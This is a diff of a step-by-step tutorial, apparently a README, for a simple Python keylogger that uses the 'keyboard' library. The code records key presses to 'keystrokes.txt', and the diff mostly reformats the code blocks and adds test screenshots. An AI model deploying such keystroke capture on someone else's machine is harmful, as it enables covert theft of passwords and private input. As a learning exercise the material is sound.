@@ -12,19 +12,20 @@ Python, code editor, Im using Visual Studio Code.
 # Step 1
 Install the Required Library.
 
-Open your command prompt or terminal and execute the following command: "pip install keyboard"
+Open your command prompt or terminal and execute the following command: 
+    "pip install keyboard"
 
 # Step 2 Importing the Necessary Libraries
 This library will enable us to work with keyboard inputs. Insert the following line of code:
 
-import keyboard
+    import keyboard
 
 # Step 3 
 Define the Log File
 
 In this example, we’ll use ‘keystrokes.txt’ as the file name. Feel free to modify it as desired. Add the following line of code:
 
-log_file = 'keystrokes.txt'
+    log_file = 'keystrokes.txt'
 
 # Step 4
 Create the Key Press Event Function
@@ -40,12 +41,12 @@ Register the Key Press Event
 
 Register the ‘on_key_press’ function to be called whenever a key is pressed. This will enable our code to capture the keystrokes. Add the following line:
 
-keyboard.on_press(on_key_press)
+    keyboard.on_press(on_key_press)
 
 # Step 6 
 Finally, we want our program to wait until a key is pressed before it exits. Use the 
 
-‘keyboard.wait()’
+    ‘keyboard.wait()’
 
 function to accomplish this.
 
@@ -56,8 +57,19 @@ function to accomplish this.
 
 # Step 7
 Open your command prompt or terminal, navigate to the directory where the script is located, and execute the command:
-cd (directory where file is stored) py keylogger.py
+    cd (directory where file is stored) 
+    
+        Cd Desktop
+        
+        py keylogger.py
+    
 
 ![Screenshot 2024-07-29 122614](https://github.com/user-attachments/assets/f943a530-664c-4562-bb25-b1f051e2e85f)
 
- 
+# Test
+
+ ![Screenshot 2024-07-29 132746](https://github.com/user-attachments/assets/1c00d045-90b2-4d0b-b0f7-f4b40383c0ed)
+# Keystrokes File Confirmation
+ ![Screenshot 2024-07-29 132909](https://github.com/user-attachments/assets/057021f9-e4bd-4fd8-928d-32cc1ee46b5b)
+
+
